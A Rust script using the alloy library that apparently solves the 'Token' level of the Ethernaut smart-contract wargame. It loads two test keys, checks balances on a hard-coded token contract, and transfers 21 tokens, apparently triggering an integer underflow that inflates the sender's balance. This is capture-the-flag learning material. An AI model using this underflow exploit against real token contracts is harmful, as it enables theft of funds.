#[allow(unused_imports)]
use alloy::{
    network::{TransactionBuilder, EthereumWallet},
    primitives::{
        address,
        utils::{format_ether, Unit},
        U256,
    },
    providers::{Provider, ProviderBuilder},
    rpc::types::TransactionRequest,
    signers::local::PrivateKeySigner,
    sol,
};

sol! {
    #[sol(rpc)]
    contract Token {
        function transfer(address _to, uint256 _value) public returns (bool);
        function balanceOf(address _owner) public view returns (uint256 balance);
    }
}

use crate::ethernaut;

use tokio::runtime::Runtime;

#[allow(dead_code)]
pub fn level05_runner() -> Result<(), Box<dyn std::error::Error>> {
    let rt = Runtime::new()?;
    rt.block_on(level05())?;
    
    Ok(())
}

async fn level05() -> Result<(), Box<dyn std::error::Error>> {
    let alice_signer: PrivateKeySigner = ethernaut::ALICE_KEY.parse()?;
    let bob_signer: PrivateKeySigner = ethernaut::BOB_KEY.parse()?;
    
    let mut wallet = EthereumWallet::from(alice_signer);
    wallet.register_signer(bob_signer);
    
    let provider = ProviderBuilder::new()
        .wallet(wallet)
        .connect(ethernaut::RPC)
        .await?;
    
    let token_address = "0xF257a3921E3faDcaFB5423B421C4deE4e0039f5B";
    let token = Token::new(token_address.parse()?, provider);
    let alice = ethernaut::ALICE;
    let bob = ethernaut::BOB;
    
    println!("[CHECK]");
    let alice_balance = token.balanceOf(alice.parse()?).call().await?;
    let bob_balance = token.balanceOf(bob.parse()?).call().await?;
    println!("[Token.balanceOf()]    alice's balance = {alice_balance}");
    println!("[Token.balanceOf()]    bob's balance = {bob_balance}\n");
    
    println!("[Transfer-1]");
    let transfer_tx = token
        .transfer(bob.parse()?, U256::from(21u64))
        .send()
        .await?;
    println!("[Token.transfer()]    Panding transaction... {}", transfer_tx.tx_hash());
    
    let transfer_receipt = transfer_tx.get_receipt().await?;
    println!(
        "[Token.transfer()]    included in block {}\n",
        transfer_receipt.block_number.expect("Failed to get block number")
    );
    
    println!("[CHECK]");
    let alice_balance = token.balanceOf(alice.parse()?).call().await?;
    let bob_balance = token.balanceOf(bob.parse()?).call().await?;
    println!("[Token.balanceOf()]    alice's balance = {alice_balance}");
    println!("[Token.balanceOf()]    bob's balance = {bob_balance}\n");   
    
    Ok(())
}

// Token = 0xF257a3921E3faDcaFB5423B421C4deE4e0039f5B